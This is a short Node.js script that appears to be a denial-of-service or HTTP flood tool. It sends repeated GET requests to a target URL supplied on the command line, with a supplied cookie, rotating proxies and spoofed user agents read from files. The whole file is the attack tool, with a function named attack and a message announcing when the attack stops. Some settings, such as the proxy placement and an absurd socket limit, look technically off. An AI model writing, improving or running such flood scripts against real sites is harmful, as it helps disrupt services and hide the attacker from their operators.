const request = require('request');
const fs = require('fs');

const url = process.argv[2];
const cookie = process.argv[3];
const duration = process.argv[4] || 60;
const proxyList = fs.readFileSync('proxy.txt').toString().split('\n');
const uaList = fs.readFileSync('ua.txt').toString().split('\n');

let i = 0;

function attack() {
  const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
  const ua = uaList[Math.floor(Math.random() * uaList.length)];

  const options = {
    url: url,
    method: 'GET',
    headers: {
      'User-Agent': ua,
      'Cookie': cookie
    },
    timeout: 1000,
    agentOptions: {
      keepAlive: true,
      keepAliveMsecs: 1000,
      maxSockets: 66666663,
      proxy: 'https://' + proxy
    },
  };

  request(options, (error, response, body) => {
    if (error) {
      console.error(`Request error: ${error.message}`);
    }
    i++;
    setTimeout(attack, 1000);
  });
}

setTimeout(() => {
  console.log(`Attack has been stopped after ${duration} seconds.`);
  process.exit();
}, duration * 1000);

attack();